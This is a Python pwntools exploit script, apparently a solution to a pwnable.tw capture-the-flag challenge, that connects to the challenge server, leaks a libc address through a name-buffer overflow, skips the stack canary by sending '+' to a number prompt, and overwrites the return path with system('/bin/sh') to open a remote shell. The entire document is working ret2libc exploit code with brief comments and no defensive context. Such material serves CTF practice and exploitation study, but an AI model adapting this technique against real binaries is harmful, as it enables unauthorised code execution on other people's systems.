from pwn import *

io = remote('chall.pwnable.tw', 10101)
libc = ELF('./libc_32.so.6')
io.recvuntil(':')

# leak libc address
io.sendline('A' * 24)
io.recvline()
libc_leak = b'\0' + io.recvuntil(':')[0:3]
libc_leak = u32(libc_leak)
leak_offset = libc.get_section_by_name('.got.plt').header.sh_addr
libc.address = libc_leak - leak_offset

# calculate system address and shell address
system_addr = libc.symbols['system']
sh_addr = list(libc.search(b'/bin/sh\x00'))[0]

io.sendline('35')

# 1 ~ 23 in first 24 numbers
for i in range(24):
	io.recvuntil(': ')
	io.sendline(str(i))

# skip canary using '+'
io.recvuntil(': ')
io.sendline('+')

# 7 libc address
for i in range(7):
	io.recvuntil(': ')
	io.sendline(str(libc.address))

# system address
io.recvuntil(': ')
io.sendline(str(system_addr))
# junk, just set it to system_addr
io.recvuntil(': ')
io.sendline(str(system_addr))
# /bin/sh
io.recvuntil(': ')
io.sendline(str(sh_addr))

io.interactive()
